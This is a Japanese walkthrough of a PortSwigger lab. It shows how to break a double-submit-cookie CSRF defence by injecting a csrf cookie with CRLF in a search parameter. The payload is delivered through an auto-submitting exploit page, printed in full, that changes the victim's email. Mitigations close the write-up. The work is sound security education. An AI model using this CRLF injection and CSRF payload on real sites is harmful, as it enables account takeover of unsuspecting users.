
## ラボの詳細手順

### Step 1: アカウントにログインして動作確認

1. ラボを開始して、Burp Suiteのブラウザを起動
2. 認証情報でログイン: `wiener:peter`
3. "Update email"機能に移動

### Step 2: 正常なリクエストをキャプチャ

1. メールアドレスを変更（例: `test@test.com`）して送信
2. Burp Proxy → HTTP historyで該当リクエストを探す
3. リクエストは大体こんな感じ：

```http
POST /my-account/change-email HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=xxxxx; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
```

### Step 3: Double Submit防御を確認

1. このリクエストを右クリック → "Send to Repeater"
2. Repeaterで以下をテスト：

**テスト1: CSRFトークンを変更**
```http
email=test@test.com&csrf=DIFFERENT_VALUE
```
→ エラーになるはず

**テスト2: Cookie と パラメータを同じ偽物に変更**
```http
Cookie: session=xxxxx; csrf=fake123
...
email=test@test.com&csrf=fake123
```
→ **成功する！** これがdouble submitの脆弱性や

### Step 4: Cookie注入ポイントを探す

1. サイト内で検索機能を探す（大体トップページにある）
2. 適当に検索: `test`
3. レスポンスを見る：

```http
HTTP/1.1 200 OK
Set-Cookie: Last-Search=test
...
```

検索語が反映されてる！

4. CRLFインジェクションを試す：
```
/?search=test%0d%0aSet-Cookie:%20csrf=fake
```

5. レスポンスを確認：
```http
HTTP/1.1 200 OK
Set-Cookie: Last-Search=test
Set-Cookie: csrf=fake
```

**注入成功！** `%0d%0a`で改行してSet-Cookieヘッダーを追加できた

### Step 5: SameSite属性を追加

クロスサイトでもcookieが送信されるように`SameSite=None`を追加：

```
/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

（`%3b` = セミコロン`;`）

### Step 6: エクスプロイトを作成

1. Burp → "Go to exploit server"
2. Bodyに以下のHTMLを記述：

```html
<html>
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@evil.com" />
      <input type="hidden" name="csrf" value="fake" />
    </form>
    
    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();" />
  </body>
</html>
```

**重要ポイント:**
- `action`のURLは自分のラボIDに変更
- `email`は自分のメールアドレスと**違う**ものに
- `csrf`値は`fake`で統一（cookieとパラメータで同じ値）
- `img`の`src`も自分のラボIDに変更

### Step 7: テスト

1. "Store"ボタンでエクスプロイトを保存
2. "View exploit"で自分でテスト
   - 自分のメールアドレスが変わるはず
   - 変わったら成功！

### Step 8: 攻撃実行

1. 自分のアカウントでメールアドレスを元に戻す
2. "Deliver to victim"をクリック
3. ラボが解決される！

## 動作の詳細フロー

```
1. 被害者がエクスプロイトページを開く
   ↓
2. <img>タグが読み込まれる
   GET /?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
   ↓
3. レスポンスでcookieが設定される
   Set-Cookie: csrf=fake; SameSite=None
   ↓
4. 画像が存在しない → onerrorイベント発火
   ↓
5. document.forms[0].submit() でフォームが自動送信
   POST /my-account/change-email
   Cookie: csrf=fake
   Body: email=hacker@evil.com&csrf=fake
   ↓
6. サーバーがチェック
   Cookie csrf == Body csrf ? → fake == fake → OK!
   ↓
7. メールアドレス変更成功
```

---

### ✅ どーいう脆弱性？

**Double Submit Cookie方式のCSRF防御が「形だけ」で、  
`csrf` Cookie と リクエストパラメータが一致していれば誰の値でも通ってしまう脆弱性。**

本来なら：

- CSRFトークンは「ユーザーのセッション」と紐付くべきやのに  
- この実装は「Cookieのcsrf」と「Bodyのcsrf」が同じかどうかしか見てない  
- さらに、アプリ内の別機能で **任意の`csrf` Cookieを植え込める（CRLFでSet-Cookie注入）**

→ 攻撃者が好きなCSRFトークンを「正しいもの」としてサーバに信じ込ませられる。

---

### 🔍 どう気づいた？

1. メール変更リクエストをBurpでキャプチャ  
   ```http
   Cookie: session=...; csrf=R8ov2...
   ...
   email=test@test.com&csrf=R8ov2...
   ```
2. Repeaterでテスト：
   - **CSRFだけ変える** → エラー  
   - **CookieとBodyのcsrfを同じ偽物に変える** → 成功  
   → 「検証は *値の一致* だけで、ユーザーとは紐付いてない」と判明
3. 検索機能のレスポンスで `Set-Cookie: Last-Search=...` を確認  
4. `?search=test%0d%0aSet-Cookie:%20csrf=fake` を投げて  
   `Set-Cookie: csrf=fake` がレスポンスに出るのを確認  
   → **CRLFで任意のcsrf Cookieを注入できる** と確定

---

### 💥 どう攻撃してる？

攻撃チェーンはこう：

1. 検索パラメータにCRLFを仕込んで、victimブラウザに  
   `Set-Cookie: csrf=fake; SameSite=None` を植え込む  
2. 同じページ内で、自動送信フォームを用意：

   ```html
   <form action="/my-account/change-email" method="POST">
     <input type="hidden" name="email" value="hacker@evil.com">
     <input type="hidden" name="csrf" value="fake">
   </form>
   <img src="/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
        onerror="document.forms[0].submit()">
   ```

3. victimがこのページを開くと：
   - まず `csrf=fake` Cookie がセットされる  
   - 画像読み込み失敗 → `onerror` でフォーム自動送信  
   - リクエストは：
     ```http
     Cookie: csrf=fake
     Body: email=hacker@evil.com&csrf=fake
     ```
4. サーバーは「CookieのcsrfとBodyのcsrfが一致してるからOK」と判断  
   → **victimのメールアドレスが攻撃者指定の値に変更される**

---

### 🛡️ どう対策する？

**設計レベルで直さなあかんやつ。**

- **CSRFトークンをセッションと紐付ける**
  - 例：`token = HMAC(sessionID, secret)` など  
  - 「誰のトークンか」を必ず検証する
- **Double Submitを使うなら「値の一致＋ユーザー紐付け」までやる**
- **任意のCookieを注入できる入力（CRLF）をサニタイズ**
  - ヘッダーに反映される値は `\r\n` を禁止
- **SameSite=Lax/Strictの活用**
- **検索語などをそのままSet-Cookieに入れない**

---

### 🎤 まとめ

> **このケースは、Double Submit Cookie方式のCSRF防御が不完全で、`csrf` Cookie とリクエストパラメータの値が一致していれば、誰の値でも受け入れてしまう脆弱性です。**  
> BurpでCSRFトークンだけ変えるとエラーになる一方、CookieとBodyのcsrfを同じ偽物にすると成功したことで気づきました。さらに、検索機能にCRLFを入れることで `Set-Cookie: csrf=fake` を注入できるため、攻撃者は任意のCSRFトークンをvictimに植え付け、自動送信フォームでメール変更を実行できます。  
> 対策としては、CSRFトークンをセッションと厳密に紐付けること、ヘッダーに入る値のCRLFサニタイズ、そしてDouble Submitを使う場合でも「値の一致だけに頼らない設計」にすることが重要です。

---
